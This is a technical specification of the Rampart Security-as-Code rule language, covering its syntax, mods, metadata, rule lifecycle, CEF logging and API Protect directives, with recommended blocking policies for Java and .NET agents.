# **Rampart Security-as-Code**.

This specification defines the Rampart Security-as-Code platform and core concepts for understanding the Rampart Security-as-Code syntax. Chapters are provided for each specific rule, with a detailed description, rule examples and log output examples.

# **The Rampart Security-as-Code Platform**

The Rampart Security-as-Code Platform is comprised of two parts: a Domain-Specific Language (DSL) for scripting run-time security policies and enhancements, and an implementation engine that interprets the Rampart DSL & APIs to apply the scripted security policies and enhancements. Here are some of the common Rampart terms used throughout this document:

| Term | Definition |
| ---- | ---------- |
| Rampart | Security-as-Code Runtime. |
| Rampart DSL/Language | The language used to script run-time security policies and enhancements. |
| Rampart Rule | One of many run-time scripts that apply policies and enhancements for specific behaviors of the application (i.e. HTTP queries, SQL transactions, file-system operations, etc.) |
| Rampart Mod | A self-sufficient Rampart program comprising one or more Rampart rules. A Rampart rule is always a member of one, and only one, Rampart Mod. |
| Rampart Rules File | A plain-text file with an extension of .Rampart that contains one or more Rampart mods. |
| Rampart Engine | The run-time implementation that interprets and executes Rampart Mods and the Rampart Rules therein. |
| Agent | The software package containing a Rampart Engine for a target run-time system (e.g., a firewall, an application, a database, or an operating system). |

The Rampart Security-as-Code Specification is defined by Waratek and its Security-as-Code community partners. The Rampart Security-as-Code Specification defines the structure of the DSL and APIs and the scriptable behaviors provided for a system’s runtime components, such as networking operations, HTTP transactions, SQL queries, and many others. These scriptable behaviors form the basis for Rampart Rules, which enable users to declaratively or imperatively define how they would like to apply security policies or enhancements for any desired target system.

The Rampart Security-as-Code Specification ensures forward compatibility with future versions of Rampart Engines.

The Rampart Security-as-Code Specification may change over time. Please consult the latest documentation for latest implementation features and details.

The Rampart Security-as-Code Specification is designed to manage run-time security policies and enhancements across various run-time systems, such as firewalls, application platforms, databases and operating systems, and across differing Rampart implementations. Rampart Mods can be loaded, reloaded, and unloaded dynamically at runtime without requiring a Rampart Engine to be restarted.

# **Rampart Language Syntax**

The structure of the Rampart language and syntax is loosely based on the YAML syntax. Users familiar with YAML and its syntax will be comfortable with programming Rampart Mods. Rampart Mods use a file extension of `.Rampart`. The content of the file is plain-text and can be written and viewed in any text editor.

The following is a high-level overview of what the Rampart language syntax looks like.

```
app("Security Rules"):
   requires(version: Rampart/2.10)

   http("a Rampart HTTP Rule"):
      ...
   endhttp

   marshal("a Rampart Marshal Rule"):
      ...
   endmarshal

   dns("a Rampart DNS Rule"):
      ...
   enddns

   socket("a Rampart Socket Rule"):
      ...
   endsocket

   filesystem("a Rampart FileSystem Rule"):
      ...
   endfilesystem

   sql("a Rampart SQL Rule"):
      ...
   endsql

   library("a Rampart Library Rule"):
      ...
   endlibrary

   patch("a Rampart Patch Rule"):
      ...
   endpatch

endapp
```

Studying the syntax at a high-level, we can see a pattern of block declarations, where each block has an opening declaration and a closing declaration. A Block can contain Statements, which are used to describe the configuration for the block.

## Block

Blocks have the following syntax:

```
<block-name-keyword>("Block Name"):
   statement(s)
end<block-name-keyword>
```

- Blocks must have an opening and a closing declaration
- A block opening declaration consists of:
    - The block name keyword,
    - followed by a **unique** **quoted string inside parentheses** to name the block,
    - followed by a **colon**, which indicates that the block is open and must be closed with a closing declaration.
- Each successive line after a block is opened is a statement of that block until it is closed.
- Each open block must be closed with the keyword **end**<block-name>.

**Block Example**

```
http("a Rampart HTTP Rule"):
   ...
endhttp
```

## Statement

Statements have the following syntax:

```
<statement-keyword>(arg1, arg2, ... argN)
```

- A statement is a declaration which is not open or closed.
- Statements do not have a colon after the closing parenthesis.
- All the configuration arguments for the statement appear within the parentheses.
- Individual configuration arguments may be Key-Value pairs, strings, numerics or constants.
- Some configuration arguments may be optional. If optional, they can be omitted.
- In certain cases, where only one Key-Value pair in a statement is mandatory, it is not necessary to state the key, and the value can be specified directly. Otherwise it is recommended to provide both the key and the value.
- Some values are constants, and do not need to be quoted. It is only necessary to quote strings which are user defined, such as a file path or the name of a parameter in a HTTP request.
- The order of the configuration arguments is not strict and they can be presented in any order.

**Statement Example**

```
requires(version: Rampart/2.10)
```

## Types Of Values

Values can be any of these types:

- **constant:** an unquoted string which is a member of a fixed enumeration of values, such as the ‘vendor’ values in the Rampart `sql()` rule, viz., `vendor(oracle)`
- **string**: any sequence of characters surrounded by double quotes. e.g. `"an example string"`.
- **integer**: an unquoted whole number without decimal point.
- **float**: an unquoted number with decimal point.
- **boolean**: an unquoted `true` or `false`. The value is not case-sensitive.
- **dictionary**: a collection of Key-Value pairs separated by commas, and expressed within curly brackets. e.g. `{"personal data form", id: 32, name: "John"}`.
- **list**: a collection of values of similar or mixed type, separated by commas, and expressed within square brackets. e.g. `[2, 3, 32, 100]`.
- A **dictionary** and a **list** value can contain other dictionaries and lists inside them.

## Comments

It is possible to include comments in a Rampart File. There are two scenarios to mention:

- The hash symbol (also known as the pound symbol) `#` can be used throughout the entire Rampart File. This is used for commenting on a per-line basis. There is no block comment equivalent.
- When inside an `app` declaration, it is possible to use a double forward-slash `//` for a single line comment or the forward-slash with star `/* */` for block comments.

```
# This kind of comment
# can be used anywhere
# in a Rampart File.

app("Security Rules"):
    requires(version: "Rampart/2.0")

    // This is a line comment
    // and can be used within
    // a Rampart App.
    http("a Rampart HTTP Rule"):

        ...
    endhttp

    /*
        This is a block comment
        which can be used within
        a Rampart App.
    */

endapp
```

## Escape Character

A Rampart string may contain any character. Double-quotes may be included in the body of a string if they are escaped with the back-slash character `\` , e.g. `\"` A backslash literal should also be escaped with a backslash to distinguish it from an escape character. Not escaping backslashes \ or double quotes " could lead to unexpected behavior.

| Valid | Invalid |
| --- | --- |
| "hello\\ world\"" | "hello world\\" |
|  | "hello w"rld" |
|  | "hello w\\\\"orld" |

The following Rampart Mod name is valid:


```
app("App name with \\ and \""):
endapp
```

The following Rampart Mod name is invalid,

```
app("App name ending slash\"):
endapp
```

### Windows Paths

The backslashes in Windows paths should be escaped. The following Windows path is valid,

```
process("Protect executable in a specific directory"):
execute("C:\\Windows\\*")
```

The following Windows path is invalid,

```
process("Protect executable in a specific directory"):
execute("C:\Windows\*")
```

## Formatting

Rampart is a free-form language, meaning that the entire contents of a Rampart File could be written on a single line. However, since Rampart is designed to be legible to humans, it is strongly recommended not to write rules in this fashion.

```
app("Security Rules"):requires(version: Rampart/2.10)endapp
```

Blocks, components and keywords must be declared in lowercase as the parser is case-sensitive. The following incorrect block does not load. Notice the malformed `ApP` and `EnDapp`.

```
ApP("Security Rules"):
requires (version: Rampart/2.10)

EnDapp
```

# **Rampart Mod**

A Rampart Mod is a single **program** for a Rampart Engine. A Rampart Mod is a mandatory declaration which defines the atomic executable unit of one or more Rampart Rules. A Rampart Rule cannot exist outside of a Rampart Mod.

It is possible to define multiple Rampart Mods in a single Rampart source file if necessary. The example shown below is the complete declaration of a Rampart Mod named “`Security Rules`". The keyword app is used to declare a Rampart Mod, which takes a string which is used to identify this Rampart Mod with a unique name. The unique name is also used for all events recorded by the Rampart Engine in the event log file. Two Rampart Mods with the same name cannot be loaded at the same time. A Rampart Mod must implement the mandatory requires() statement and contain at least one Rampart Rule. An empty Rampart Mod with no rules, as shown in the **Rampart Mod Example**, is not valid.

## Requires

The `requires()` statement provides details about what is required for the Rampart Mod to run. It must be declared before any rules, otherwise the Mod fails to load and an error is logged in the CEF log. For now, the `requires()` statement only takes a single `Key-Value` pair which declares the minimum required Rampart language level to be supported by the agent for the Rampart App to run. Future versions of Rampart will support further overloading with additional requirements.

## Version

The `version()` directive allows a Rampart developer to declare precedence between multiple Rampart Mods of the same name. When a Rampart developer commits a newer version of a mod, any older versions of the same mod are ignored by the agent when present in the same load cycle. The `version` declaration is optional, but if provided, must be specified before any rule is declared. Its default value when not declared is `1`. In the case of multiple Rampart mods with the same name and different versions, only the mod with the highest `version` is committed to the agent.

Consider the following example:

```
app("Security Policy"):
    requires(version:"Rampart/2.10")
    version(2)
    // some Rampart Rules

endapp

app("Security Policy"):
    requires(version:"Rampart/2.10")
    version(3)
    // some Rampart Rules

endapp
```

In the above case, the Rampart mod with version `2` is ignored and version `3` of the mod is loaded instead. The following log message is generated for the mod with the lowest version:

```
in file "/tmp/example.Rampart": Rampart mod "Security Rules" overridden by mod with version "2"
```

In the case where two Rampart mods have the same `version`, then both mods fail to load due to a conflict with their name IDs.

For every security event generated by a rule, the CEF extension `appVersion` indicates the version of its mod. See more details about CEF extensions later in the document.

## Metadata

The `metadata()` directive allows a Rampart developer to declare useful metadata for a Rampart mod and rules within the mod. Considering the case of a Rampart `patch()`rule, the metadata could contain information about a vulnerability’s CVE or CWE, which software it targets, when the `patch` was created, and the CVSS score of the vulnerability. All this data is parsed and modeled by the Rampart language and consumed by the Agents, which can then interact with it programmatically through the Rampart API. This feature extends the bridge between Rampart mod developers and Rampart language consumers (systems that parse and interact with mods), making it possible for automatic Rampart mod integrations into these systems.

The metadata statement is optional at both the mod and rule levels. In this section, the focus is on the mod level, but the concept is similarly applied at the rule level. See the **Rampart Rule** section for guidance on declaring metadata at the rule level.

Metadata declared at the mod level is inherited by all rules within that mod.

The `metadata()` statement is declared as follows:

```
app("CVE-2021-2432"):
    requires(version: Rampart/2.10)
    metadata(
        cve: "CVE-2021-2432",
        cvss: {
            score: 3.7,
            version: 3.0,
            vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"},
        description: "This vulnerability may be exploited by a remote
      non-authenticated attacker to perform service disruption.
      The vulnerability exists due to improper input validation
      within the JNDI component in Java SE."
  )

    patch("JNDI component fix"):
            ...
    endpatch

endapp
```

It takes a comma-separated list of Key-Value pairs. Any of the Rampart primitive types can be used as values: string literals, constants, floats, integers, booleans, lists or nested Key-Value pairs.

ℹ️ Duplicate keys within `metadata` generate an error message resulting in the mod being invalidated.

There is a list of metadata keys which have been standardized, and so, their values are validated when a Rampart mod is parsed. The following table lists these keys and the enforced structure of their corresponding values:

| Key | Description | Enforced value structure | Rampart language example cases |
| --- | ----------- | ------------------------ | ------------------------------ |
| cve | CVE ID of the vulnerability | Any non-empty string literal or a list of non-empty string literals | cve: "CVE-2020-4000" cve: ["CVE-2020-4000", "CVE-2020-4001"] |
| cwe | CWE category of the vulnerability | Any non-empty string literal or a list of non-empty string literals | cwe: "CWE-89" cwe: ["CWE-89", "CWE-564"] |
| cvss | CVSS score of the vulnerability | A list comprised of the following Key-Value pairs: • key score where its value must be a float • key version where its value must be a float • key vector where its value must be a string literal | cvss: {score: 10.0, version: 3.1, vector: "..."} |
| description | Text describing the vulnerability or the mod or the rule | Single string literal | description: "The vulnerability allows a remote non-authenticated attacker to perform service disruption." |
| affected-os | Operating systems affected by the vulnerability | Any non-empty string literal or a list of non-empty string literals | affected-os: "Windows" affected-os: ["Windows", "Linux"] |
| affected-product-name | Name of the product affected by the vulnerability | Single string literal | affected-product-name: "Struts 2" |
| affected-product-version | Version of the product affected by the vulnerability | Single string literal or a list of ranges. A range is comprised of a key range and a value comprised of 2 Key-Value pairs: from and to. Multiple ranges can be defined. If a single string is specified, a single range is interpreted internally with the same value for from and to Key-Value pairs. range: {from: "1.0.0", to:                     "1.0.0"} | affected-product-version: "2.5.27" affected-product-version: {range: {from: "2.5.20", to: "2.5.27"}} affected-product-version: {range: {from: "2.5.20", to: "2.5.27"}, range: {from: "2.6.0", to: "2.6.8"}} |
| creation-time | Time when the mod or rule was created | Single string literal | creation-time: "Tue 02 Nov 2021 15:46:13 GMT" |
| version | Development version of the rule | Integer | version: 2 |

None of the metadata keys above is mandatory.

Ad-hoc keys - meaning any key not in the table above - may also be used. These are classified as non-standardized metadata and they are not validated by the Rampart engine. Such keys can have any data structure which is supported by the Rampart language. Examples of two valid, ad-hoc metadata statements are shown below:

```
app("2021 JULY CPU"):
    requires(version: Rampart/2.10)
    metadata(foo: "bar")
    patch("JNDI component fix"):
        ...
    endpatch
endapp
```

```
app("2021 JULY CPU"):
    requires(version: Rampart/2.10)
    metadata(complex: {foo: "bar"})
    patch("JNDI component fix"):
        ...
    endpatch
endapp
```

### Making Metadata Loggable

The `log` metadata key is reserved for specifying metadata keys and values that should be logged in security events related to the rule, viz.:

```
app("CVE-2021-2432"):
    requires(version: Rampart/2.10)
    metadata(
        log: {
            cve: "CVE-2021-2432"
        },
        cvss: {
            score: 3.7,
            version: 3.0,
            vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"},
        description: "The vulnerability allows a remote non-authenticated attacker to
            perform service disruption. The vulnerability exists due to improper
            input validation within the JNDI component in Java SE. A remote
            non-authenticated attacker can exploit this vulnerability to perform
            service disruption.")

    patch("JNDI component fix"):
        ...
    endpatch

endapp
```

In the case of a security event being triggered by any rule in the mod above, since the metadata is specified at the mod level, the `cve` metadata key and value are emitted as a CEF extension called ‘cve’ in the security log file, thus:

```
CEF:0|Rampart:Rampart|Rampart|2.10|validate component|Load Rule|Low|rt=Feb 23 2022 17:39:02.1044 +0000 appVersion=1 cve=["CVE-2021-2432"] dvchost=test-host ruleType=patch procid=324782 securityFeature=patch outcome=success
```

There are two ways to mark metadata as loggable:

- Multiple `log` Key-Value pairs, or
- A single `log` Key-Value pair containing all the metadata to be logged.

```
app("CVE-2021-2432"):
    requires(version: Rampart/2.10)
    metadata(
        log: {
            cve: "CVE-2021-2432",
            description: "The vulnerability allows a remote non-authenticated attacker to
                perform service disruption. The vulnerability exists due to improper
                input validation within the JNDI component in Java SE. A remote
                non-authenticated attacker can exploit this vulnerability to perform
                service disruption."
        })

    patch("JNDI component fix"):
        ...
    endpatch
endapp
```

```
app("CVE-2021-2432"):
    requires(version: Rampart/2.10)
    metadata(
        log: {
            cve: "CVE-2021-2432"
        },
        log: {
            description: "The vulnerability allows a remote non-authenticated attacker to
                perform service disruption. The vulnerability exists due to improper
                input validation within the JNDI component in Java SE. A remote
                non-authenticated attacker can exploit this vulnerability to perform
                service disruption."
        })

    patch("JNDI component fix"):
        ...
    endpatch

endapp
```

### Reserved Key Names

There is a set of metadata key names that are reserved and may not be included in a log statement. These are security CEF extensions that are used by Rampart Engines and cannot be logged as part of CEF events. These extensions are: `agentName`, `ruleType`, `rt`, `dvchost`, `procid`, `nodeid`, `appVersion` and `securityFeature`. If any of the keys above are used as metadata and marked for logging, the agent logs a single CEF event indicating the error and the extension is not logged in any of the events.

ℹ️

The list of reserved extensions may grow in the future as and when new extensions are introduced in new Rampart Specification versions.

The same occurs in the case of metadata keys that are marked for logging and that duplicate any extension already present in a normal security event. The agent security logging data always takes precedence over metadata logged keys. A single CEF event error is logged in this case and the metadata key is ignored from the CEF event.

## Rampart Language Level

As shown in the example, this Rampart App requires a minimum Rampart language level of `2.0` to be supported by the Rampart agent. Both the `version` key and string value must be stated. The Rampart language level version is based on the **Semantic Versioning** format of `major.minor`. Incrementing the `major` value represents new functionality that breaks backward compatibility with the previous release. Incrementing the `minor` value means new functionality has been added that does not break backwards compatibility. In the case of a `minor`increment, agents that are in the same `major` version range, but have a lower `minor` value, simply ignore new functionality. If either the version string is invalid or the version is unsupported, the app fails to load and an error message is printed to the CEF log file.

## Rampart Mod Example

The following example shows a well formatted Rampart Mod, so long as at least one Rampart Rule is contained within the Rampart Mod. Please consult the **Rampart Rule** section for more information on available rule types.

```
app("Security Policy"):
    requires(version:"Rampart/2.10")
    // some Rampart Rules

endapp
```

In the example shown here, the `requires()` statement is missing.

```
app("Security Policy"):

endapp
```

The invalid Rampart Mod would generate an error message in the security log file.

```
<unknown>: line 3: col 0: Invalid input: 'endapp' expecting: 'requires'
```

# **Rampart Rule**

The term *Rampart Rule* is an umbrella term which includes all of the rules mentioned in the **Rampart Rules** section. Each rule type has a unique set of statements to describe and configure the security control.

See the individual rule types for more detailed descriptions.

## Rampart Rule Parts

While each Rampart rule models a different aspect of a system, each rule shares a common set of requirements. Each Rampart rule operates on a set of **given** conditions that must be configured so that if and **when** an event is triggered, **then** an action is taken. This style of behavior is analogous to behavioral test-driven development of **given-when-then**. The documentation describes how each part is configured.

```
rule("a Rampart Rule"):
    given("various conditions")
    when("event occurs")
    then("take action")
endrule
```

Every Rampart Rule is configured in a similar fashion, using these **Given**, **When**, **Then** states. Each rule uses these headings to describe how each specific rule needs to be configured.

## Given (Conditions)

Each Rampart rule allows a user to specify a unique set of conditions (configuration options) that help to specify the nature of the event or define parameters that need to be enforced should an event be triggered. The configuration of the conditions is specific to each Rampart rule. Please consult each rule to learn how to configure it correctly.

## When (Event)

The occurrence of an event is where an attack has been detected under the specified conditions and an action needs to be taken. The configuration of the event is specific to each Rampart rule. Please consult each rule to learn how to configure it correctly.

ℹ️

If multiple Rampart rules exist for a given security feature, precedence is given to the Rampart rule with the more specific event condition, and this rule is the one that triggers. For example, if a file path is specified as a condition in which the rule should trigger, then the Rampart rule with the most specific file path takes precedence.

## Then (Action)

Rampart rules perform an action on the basis of an event being triggered. In such cases, a Rampart rule can be configured to take action in a number of ways. Some actions have higher priorities than others, which override rules with lower priority actions. This makes it possible to chain rules together. For example, it is possible to have a broad rule with a lower priority action that denies all events and then to have a more specific rule with a higher priority action that allows events under certain conditions.

ℹ️ After event condition specificity, action priority then determines rule precedence. Action priority from highest to lowest is: allow (where supported), protect, detect.

| Action | Description |
| ------ | ----------- |
| detect | Used for monitoring events that have been triggered. Since this action does not interfere with other actions, it always runs. A log entry is made in the CEF log file. |
| allow | Used for allowing specific events to happen, overriding the events that are otherwise protected. A log entry is made in the CEF log file. |
| protect | Used for specifying events to protect. The type of protection is dependent on the Rampart rule type. A log entry is made in the CEF log file. |
| code | A user-specified block of code that is run when the event has been triggered. No log entries are recorded on execution unless configured by the Rampart developer. In Rampart 2.0, code blocks are only supported in the Rampart Patch rule; in Rampart 3.0 and above, code blocks are supported in all rules. |

The action statement may specify a log message. If a log message is specified then a log entry is generated. The user can specify a custom message to be included in the log entry or if the log message parameter is left blank, a default log entry is generated.

ℹ️ The log message parameter is mandatory for an action of detect, and is optional for an action of allow or protect. If the log message parameter is omitted then logging is switched off.

For an action of `detect`, `allow` or `protect`, the action statement may specify a severity. If no severity value is provided then the default severity is set to `Unknown`. The user may specify the severity as an integer in the range of 0-10 inclusive (0 being least severe and 10 being most severe). The severity may also be specified as one of the following: `Low`, `Med`, `High` or `Very-High` (case insensitive).

## Metadata

As described in more detail in the **Rampart Mod** section, it is possible to declare a `metadata()` statement since `Rampart/2.6`, which can be declared either at the mod or rule levels. This section describes the use case at the rule level.

ℹ️ All rule types support `metadata()` statements.

The behavior of the metadata at the rule level is to inherit all metadata Key-Value pairs from its originating mod (if there are any) in addition to those defined within the rule itself. Also, whatever defined Key-Value pairs that already exist at the mod level are overridden by the metadata at the rule level, if they share the same keys. Considering the following example when the mod contains part of a quarterly security update for Java:

```
app("2021 JULY CPU"):
    requires(version: Rampart/2.10)
    metadata(
        affected-os: any,
        affected-product-name: "Java SE",
        affected-product-version: {
            range: {from: "7u0", to: "7u301"}})

    patch("CVE-2021-2432 - JNDI component"):
        metadata(
            cve: "CVE-2021-2432",
            cvss: {
                score: 3.7,
                version: 3.0,
                vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"},
            description: "The vulnerability allows a remote non-authenticated attacker to
                perform service disruption. The vulnerability exists due to improper
                input validation within the JNDI component in Java SE. A remote
                non-authenticated attacker can exploit this vulnerability to perform
                service disruption.",
            affected-product-version: {
                range: {from: "7u171", to: "7u301"}})
        ...
    endpatch
endapp
```

The `patch` above inherits the following metadata Key-Value pairs: `affected-os`, `affected-product-name` and `affected-product-version` but also contains these additional ones: `cve`, `cvss` and `description`. As for the value of `affected-product-version`, since the rule overwrites its inherited value from the mod, it is now:

```
affected-product-version: {
    range: {from: "7u171", to: "7u301"}}
```

### Logging metadata

Similarly to the **Rampart Mod** section, the `log` key must be used whenever a metadata Key-Value pair should be logged in security events. At the rule level, this means that every event for that rule contains any Key-Value pairs marked for logging. Equally with the case example above, `metadata` at the rule level takes precedence and it overrides any behavior or value set out by the originating Rampart mod. So if the metadata with key `affected-product-version` is marked for logging at the rule level, it is logged in security events, thus overwriting the value set out in the originating mod.

## Valid Rampart Example

This example shows how a Rampart Mod may be configured using the Rampart HTTP rule to detect requests to the endpoint `"/webapp/index.jsp"` which do not have an origin of `"host1"`, `"host2"`, or `"host3:8080"`. In this case, the **conditions** of this rule are predicated on a URI endpoint of `"/webapp/index.jsp"`. Any request that matches that endpoint is then checked for the CSRF same origin event, indicated by `csrf()` statement. The event needs to be configured as a same-origin event using the `same-origin` keyword. In this case, the request must have the `origin` header containing a host that matches one of the hosts specified in the rule. Should a request fail the parameters declared in the event, then an **action** is taken. In this case, the `detect()` action takes place, alerting the user that an invalid request was detected.

```
app("Security Rules"):
    requires (version: "Rampart/2.0")

    http("Detect HTTP requests with invalid origin header"):
            request(paths: "/webapp/index.jsp")
            csrf(same-origin,
                options: {
                    hosts: ["host1", "host2", "host3:8080"]})
            detect(message: "HTTP Same Origin validation failed", severity: 7)
        endhttp

endapp
```

## Invalid Rampart Example

Unrecognized but well-formatted rule declarations inside the app are ignored by the parser. Consider the example below. The `foo` block is ignored but the `http` rule is still loaded. If an invalid Rampart Rule exists, an error message is printed to the CEF log.

```
app("Security Rules"):
    requires (version: "Rampart/2.0")

    foo("a foo rule"):
    endfoo

    http("Deny HTTP requests with invalid origin header"):
        request(paths: "/webapp/index.jsp")
        csrf(same-origin,
            options: {
                hosts: ["host1", "host2", "host3:8080"]})
        detect(message: "HTTP Same Origin validation failed", severity: 7)
    endhttp

endapp
```

## Rampart Rule Life-Cycle

Every Rampart Rule transitions through a five-stage lifecycle inside the Rampart Engine. Understanding this lifecycle is important in order to understand the state of the rules inside the Rampart Engine. With the exception of execute, each state of the rules lifecycle is shown in the CEF log. The following table describes each state.

| load | The syntax of the Rampart rule is valid and the rule has been loaded into the Rampart Engine. |
| link | The Rampart rule has been compiled into the running application and is ready to begin executing on the next occurrence of the defined event. |
| execute | The Rampart rule has executed and the action of the rule has been applied. Each execution of the Rampart rule is a unique execute event. Execute events are not recorded in the CEF log file, although some Rampart Engine implementations may provide special configuration options to enable CEF logging of execute events. |
| unlink | The Rampart rule has been uncompiled from the running application and will no longer execute on future occurrences of the defined event. |
| unload | The Rampart rule has been unloaded from the Rampart Engine. |
| reload | Rule(s) are reloaded by the Rampart Engine on detection of a change to rule content |

ℹ️

Reloading of rules only occurs when the rule’s configuration and desired behavior have changed such as log message and/or application code, otherwise, the rule is not reloaded.

ℹ️

Only changed Rampart mods are reloaded.

The output of the Security CEF log file has the following format.

```
<14>1 2020-03-10T14:51:34.493Z localhost.localdomain java 52928 - - CEF:0|Rampart:Rampart|Rampart|2.10|CVE-2019-2769 :01|Link Rule|Low|outcome=success procid=52928 dvchost=localhost.localdomain rt=Mar 10 2020 14:51:34.493 +0000 appVersion=1
<14>1 2020-03-10T14:51:34.493Z localhost.localdomain java 52928 - - CEF:0|Rampart:Rampart|Rampart|2.10|CVE-2019-2769 :01|Link Rule|Low|outcome=success procid=52928 dvchost=localhost.localdomain rt=Mar 10 2020 14:51:34.494 +0000 appVersion=1
```

## Limiting Rampart rules to specific Operating Systems

Additionally, each Rampart rule can be restricted to run on specific operating systems. This is particularly useful for security protections that are OS-dependent (e.g. file reads and writes) and allows for large-scale deployments of whole policies with Rampart Mods that target different Operating Systems. It also notifies agents of whether the rule is applicable and should be applied to the OS that it is currently running on.

To enable the OS constraint, pass the OS name, or a comma-separated list of names, as an argument to the rule. Examples:

- `rule(”my_rule”, os: [windows]):`
- `rule(“my_rule2”, os: [linux, solaris]):`

The valid constants are:

- windows
- linux
- aix
- solaris
- any

When the Rampart Mod is loaded, if it does not satisfy the OS constraint, a log entry such as the following is produced:

```
<14>1 2020-07-10T11:12:06.213Z I-dev05 java 91730 - - CEF:0|Rampart:Rampart|Rampart|2.10|CVE-2019-2933 :04|Load Rule|Low|rt=Jul 10 2020 11:12:06.213 +0100 dvchost=I-dev05 procid=91730 outcome=failure reason=rule is not applicable to the currently running operating system appVersion=1
```

# **API Protect**

## **API Protect Directives**

The following Rampart rules support the API Protect `api()` and `input()` directives:

- DNS
- Filesystem
- Socket
- Process

Both the `api()` and `input()` directives are additional conditions of use when the given rule is applicable. These directives complement the primary selector directive for each rule, which in most cases should be a wildcard. For example, the `read()` or `write()` directives in the case of the Filesystem rule. In general, a Rampart rule configured for API Protect should apply to "all DNS requests", "all files and folders", "all sockets" and "all external processes". This is covered further in the **Recommended API Protect Policy** section.

⚠️ Neither `api()` nor `input()` is valid in a Rampart rule with an action of ALLOW. That is, it is not possible to create a Rampart whitelisting rule which would only be applicable in the context of processing API requests.

| api | api() is used to specify endpoints that the rule is only applicable to when the application is performing operations needed to satisfy RESTful API processing HTTP requests. Using the following configuration options, this directive can be tailored to target all API endpoints, or a specific selection of one or more API endpoints. Valid values for the api() directive are:

• any: the wildcard value. When api(any) is specified in a supported rule, the rule is applicable for all API processing HTTP requests.
	◦ This value can not be combined with any of the other valid values described below.
• a single endpoint, for example: /resources/v2/file. When api("/resources/v2/file") is specified in a supported rule, the rule is applicable to that single endpoint only.

• multiple endpoints, for example api("/api/v3", "/api/v4"). When multiple endpoints are specified in a supported rule, the rule is applicable to all specified endpoints
	◦ multiple endpoints are expressed as a list of comma-separated strings as in the example above.

• when specifying API endpoints, the wildcard character (*) is supported to cover a range of endpoints. This can be specified as:
	◦ a prefix */endpoint
	◦ a suffix /api/v2/*
	◦ both a prefix and a suffix */cars*
A value must be specified for the api() directive.|

| input | input() is already available in a number of Rampart rules for existing security features, such as those which prevent injection-based attacks. This allows the user to specify the source of the untrusted data. The following three sources are supported:
• http data introduced via HTTP/HTTPS requests
• database data introduced via JDBC connections
• deserialization data introduced via Java or XML deserialization
The rule triggers if the source of the untrusted data matches that specified in the rule. If no value is specified then a default value of http is used. An exception is thrown if an unsupported value is provided. This directive should be understood as a condition for when the rule is applicable. Specifically, the rule is applicable where:
• DNS: the host name was provided by text that originated from the above specified source(s).
• Filesystem: any portion of the file or folder name was provided by text that originated from the above specified source(s).
• Socket: the host name, IP or port was provided by text that originated from the above specified source(s).
	◦ input() is available for the Socket connect() rule only.
• Process: any part of the command to execute was provided by the text that originated from the above specified source(s). |

The following is an example of how the Rampart DNS rule may be configured for API Protect:

```
dns("API block any DNS address resolution"):
    lookup(any)
    api(any)
    input(http)
    protect(severity: High)
enddns
```

That is, this rule protects against DNS address resolutions for all API endpoints where the host name was provided by text that originates from an HTTP/HTTPS request.

## **Interaction Between Valid Rampart Rule Directives**

The API Protect directives `api()` and `input()`, provide an additional protection mechanism for API requests on top of the existing protection that the supported rule otherwise provides. For example, for the Filesystem rule, the `api()` and `input()` directives can be specified in addition to the primary read() and write() selectors for this rule. It is therefore possible to specify multiple Rampart rules which are almost identical except for the presence of the API Protect directives.

## Rampart Rules without API Protect directives

These Rampart rules are, by default, also applicable for API requests.

## Rampart Rules with input() API Protect directive

**Case 1**

When:

- only a single DNS, Filesystem, Process or Socket rule exists,
- and they either: do or do not have the `input()` directive.

Then:

- rule applicability is straightforward and the primary selector for the rule is considered by the Agent as before,
- and the `input()` directive is applied, if specified.

**Case 2**

Although not always the case, it is likely that this scenario is the result of using a wildcard in the Rampart rule primary selector.

When:

- two or more rules match the combination of both primary selector **and** `input()` directive

Then, the effective rule is chosen as follows:

For Process, Filesystem and DNS:
    - The rule with the higher priority action is taken (in order from highest to lowest this is: PROTECT, DETECT),
    - If rules have the same action, then the rule with the highest logging severity is applied,
    - A rule that specifies the ALLOW action is chosen over a rule that specifies the `input()` directive,
    - Otherwise, with the same action and logging severity, the first rule defined in the Policy is used.

For Socket:
    - The rule with the higher priority action is taken (in order from highest to lowest this is: ALLOW, PROTECT, DETECT),
    - Otherwise, if actions are the same, the first rule defined in the Policy is used.

## Rampart Rules with api() API Protect directive

When the `api()` directive is specified, the rule selection is performed as follows:

1. An operation is matched against *primary selectors* of all rules in the given Policy.
2. Preference is given to the rule with the *most specific* selector (i.e. non-wildcard or longer matching sequence).
    1. **Note** there is no attempt made to select the most specific value provided in the `api()` directive. The value provided in the `api()` directive is simply the additional condition for when the rule is applied.
3. Once the rule is selected: if the current API request path matches the `api()` directive then the rule is applied, otherwise the rule is not applied and the operation behaves as it otherwise would.

# **Recommended API Protect Policy**

Below are policies recommended for Java and .Net Agents respectively. These are recommended production system policies, and it is advised that these are first verified on a suitable test system. When verifying these policies on a test system the `protect()` actions may be replaced with `detect()` actions to enable passive assessment of how the application behaves with the policy in place.

**Java Agent Recommended API Protect Policy**

```
app("strict API hardening policy for Java"):
    requires(version: Rampart/2.10)

    dns("API block any DNS address resolution"):
        lookup(any)
        api(any)
        input(http, database, deserialization)
        protect(message: "", severity: High)
    enddns

    filesystem("API block any file read operations"):
        read("*")
        api(any)
            protect(message: "", severity: High)
    endfilesystem

    filesystem("API block any file write operations"):
        write("*")
        api(any)
        protect(message: "", severity: High)
    endfilesystem

    process("API block any process forking operations"):
        execute("*")
        api(any)
        protect(message: "", severity: High)
    endprocess

    socket("API block any incoming traffic using new connections"):
        accept("0.0.0.0:0")
        api(any)
        protect(message: "", severity: High)
    endsocket

    socket("API block any outgoing traffic using new connections"):
        connect("0.0.0.0:0")
        api(any)
        protect(message: "", severity: High)
    endsocket

endapp
```

**.NET Agent Recommended API Protect Policy**

```
app("W4NC Agent Api Hardening"):
    requires(version: Rampart/2.10)

    dns("API DNS"):
        lookup(any)
        api(any)
        protect(message: "", severity: High)
    enddns

    filesystem("API File Read"):
        read("*")
        api(any)
        input(http,database)
        protect(message: "", severity: High)
    endfilesystem

    filesystem("API File Write"):
        write("*")
        api(any)
        input(http,database)
        protect(message: "", severity: High)
    endfilesystem

    process("API Process Forking"):
        execute("*")
        api(any)
        protect(message: "", severity: High)
    endprocess

    socket("API Socket Connect"):
        connect("0.0.0.0:0")
        api(any)
        protect(message: "", severity: High)
    endsocket

